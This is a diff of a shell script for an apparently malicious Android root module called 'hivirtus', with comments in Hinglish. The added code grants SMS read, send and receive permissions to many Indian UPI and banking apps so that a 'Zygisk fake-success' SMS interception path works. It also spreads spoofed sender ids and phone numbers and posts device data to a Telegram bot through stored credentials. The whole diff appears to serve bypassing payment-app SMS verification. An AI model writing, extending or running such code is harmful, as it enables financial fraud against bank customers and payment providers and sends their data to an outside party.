@@ -184,7 +184,30 @@ sync_config() {
       chmod 644 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
       chmod 644 "$MODDIR/spoof_phone.txt" 2>/dev/null
     fi
-    # Root pe Telegram creds promote — app UID write fail ho to bhi Save kaam kare
+    # Promote sender id from Save JSON → durable files (menu cut pe na hatе)
+    SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    if [ -n "$SID" ] && [ "$SID" != "AD-TEST-S" ]; then
+      echo "$SID" > /data/local/tmp/hivirtus_sender_id.txt
+      echo "$SID" > "$MODDIR/sender_id.txt"
+      chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
+    fi
+    if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
+      cp -f /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
+    fi
+    if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
+      cp -f /data/local/tmp/hivirtus_ui_save.json "$MODDIR/ui_save.json" 2>/dev/null
+    fi
+
+    # Global push: token/chat/sender/phone — TG ke bina bhi (menu cut pe sab apps me rahe)
+    NEED_PUSH=0
+    [ -f /data/local/tmp/hivirtus_save_ok.flag ] && NEED_PUSH=1
+    NOW=$(date +%s)
+    LAST_PUSH=$(cat /data/local/tmp/hivirtus_global_push.ts 2>/dev/null || echo 0)
+    if [ $((NOW - LAST_PUSH)) -ge 30 ]; then
+      NEED_PUSH=1
+      echo "$NOW" > /data/local/tmp/hivirtus_global_push.ts
+    fi
+
     TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
@@ -195,43 +218,29 @@ sync_config() {
       printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
         > "$MODDIR/telegram_credentials.json" 2>/dev/null
       chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
-      # Promote sender id to module
-      if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
-        cp -f /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
-      fi
-      if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
-        cp -f /data/local/tmp/hivirtus_ui_save.json "$MODDIR/ui_save.json" 2>/dev/null
-      fi
-      # Push to all apps only on Save / new creds (not every 2s)
-      NEED_PUSH=0
-      [ -f /data/local/tmp/hivirtus_save_ok.flag ] && NEED_PUSH=1
       [ "$NEW_HASH" != "$OLD_HASH" ] && NEED_PUSH=1
-      if [ "$NEED_PUSH" = "1" ]; then
-        hivirtus_seed_app_code_cache 2>/dev/null
-      fi
 
-      # TG test: (1) new token OR (2) explicit Save with 3-min cooldown
+      # TG test: SIRF ek baar per token|chat (Save pe spam mat karo)
+      SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
       QUEUE=0
-      if [ "$NEW_HASH" != "$OLD_HASH" ]; then
+      if [ "$NEW_HASH" != "$OLD_HASH" ] && [ "$NEW_HASH" != "$SENT_HASH" ]; then
         QUEUE=1
         echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
         echo "tg_test_queued_new_creds $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      elif [ -f /data/local/tmp/hivirtus_save_ok.flag ]; then
-        NOW=$(date +%s)
-        LAST=$(cat /data/local/tmp/hivirtus_tg_manual_test.ts 2>/dev/null || echo 0)
-        if [ $((NOW - LAST)) -ge 180 ]; then
-          QUEUE=1
-          echo "$NOW" > /data/local/tmp/hivirtus_tg_manual_test.ts
-          echo "tg_test_queued_save $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-        fi
+      else
+        echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
       fi
-      rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
       if [ "$QUEUE" = "1" ]; then
         echo 1 > /data/local/tmp/hivirtus_tg_test.request
-        rm -f /data/local/tmp/hivirtus_tg_test_fails /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null
+        rm -f /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null
         chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
       fi
     fi
+
+    if [ "$NEED_PUSH" = "1" ]; then
+      hivirtus_seed_app_code_cache 2>/dev/null
+    fi
+    rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
   fi
 }
 
@@ -403,30 +412,34 @@ hivirtus_apatch_allow_upi_inject 2>/dev/null &
   done
 ) &
 
-# DISABLED was wrong for Hero SENDTO miss — UPI-only SEND_SMS deny as safety net
-# (Messages app still can send; Intent/ISms hooks must catch compose. This blocks direct SmsManager.)
-enforce_sms_block() {
-  local on=0
-  if [ -f "$RUNTIME" ]; then
-    grep -q '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' "$RUNTIME" 2>/dev/null && on=1
-    grep -q '"hook_outgoing_sms"[[:space:]]*:[[:space:]]*true' "$RUNTIME" 2>/dev/null && on=1
-  fi
-  [ "$on" = "0" ] && [ -f /data/local/tmp/hivirtus_ui_save.json ] && \
-    grep -q '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null && on=1
-  # Default ON when no config readable
-  [ "$on" = "0" ] && [ ! -f "$RUNTIME" ] && [ ! -f /data/local/tmp/hivirtus_ui_save.json ] && on=1
-  [ "$on" = "0" ] && return 0
-
+# CRITICAL: NEVER deny SEND_SMS — appops ignore → "Verification Failed / No permission"
+# Restore allow + pm grant so Zygisk fake-success path works (Axis/Hero UPI)
+restore_sms_permission() {
   for pkg in \
     com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
-    com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
-    com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android
+    com.herofincorp.android com.herofincorp.upi \
+    com.phonepe.app com.phonepe.app.business \
+    com.google.android.apps.nbu.paisa.user net.one97.paytm \
+    com.myairtelapp com.yespay.next com.yesbank.yespay com.yesbank.yespaynext \
+    com.kreditbee.android com.stashfin.android com.snapmint.customerapp \
+    com.hdfcbank.payzapp com.axis.mobile com.axis.mobilebanking \
+    in.axisbank.upi com.upi.axispay com.axismobile \
+    in.org.npci.upiapp
   do
     pm path "$pkg" >/dev/null 2>&1 || continue
-    appops set "$pkg" SEND_SMS ignore 2>/dev/null || \
-      cmd appops set "$pkg" SEND_SMS ignore 2>/dev/null || true
+    appops set "$pkg" SEND_SMS allow 2>/dev/null || \
+      cmd appops set "$pkg" SEND_SMS allow 2>/dev/null || \
+      appops set "$pkg" SEND_SMS default 2>/dev/null || true
+    pm grant "$pkg" android.permission.SEND_SMS 2>/dev/null || true
+    pm grant "$pkg" android.permission.READ_SMS 2>/dev/null || true
+    pm grant "$pkg" android.permission.RECEIVE_SMS 2>/dev/null || true
   done
+  echo "sms_perm_restored $(date +%s)" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
 }
+enforce_sms_block() { restore_sms_permission; }
+
+# Boot: clear any leftover SEND_SMS ignore from older builds (fixes Axis "No permission")
+restore_sms_permission
 
 # Promote blocked JSON from app code_cache / module dir → tmp (A16 app can't write tmp)
 harvest_blocked_outgoing() {
@@ -677,7 +690,7 @@ tg_http_post() {
   return 1
 }
 
-# Save pe Telegram test — exact format (rate-limited; Save can retest)
+# Save pe Telegram test — SIRF ek baar per token|chat
 send_tg_test_if_requested() {
   [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
   read_tg_creds
@@ -686,7 +699,11 @@ send_tg_test_if_requested() {
     return 0
   fi
   CUR_HASH="${TG_TOKEN}|${TG_CHAT}"
-  # Rate limit attempts (not permanent block) — 60s between tries
+  SENT_HASH=$(cat /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null)
+  if [ -n "$SENT_HASH" ] && [ "$CUR_HASH" = "$SENT_HASH" ]; then
+    rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
+    return 0
+  fi
   NOW=$(date +%s)
   LAST_TRY=$(cat /data/local/tmp/hivirtus_tg_test_last_try.ts 2>/dev/null || echo 0)
   if [ $((NOW - LAST_TRY)) -lt 60 ] && [ -f /data/local/tmp/hivirtus_tg_test_fails ]; then
@@ -711,6 +728,7 @@ Device: ${DEV}"
   SENT=0
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
   if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
+    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
     echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
     rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD" /data/local/tmp/hivirtus_tg_test_fails
     echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
@@ -719,6 +737,8 @@ Device: ${DEV}"
     FAILS=$((FAILS + 1))
     echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
     if [ "$FAILS" -ge 2 ]; then
+      # Stop retry spam — mark sent so we don't loop
+      echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
       rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails "$PAYLOAD"
     fi
     echo "tg_test_fail $(date +%s) resp=$(head -c 120 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
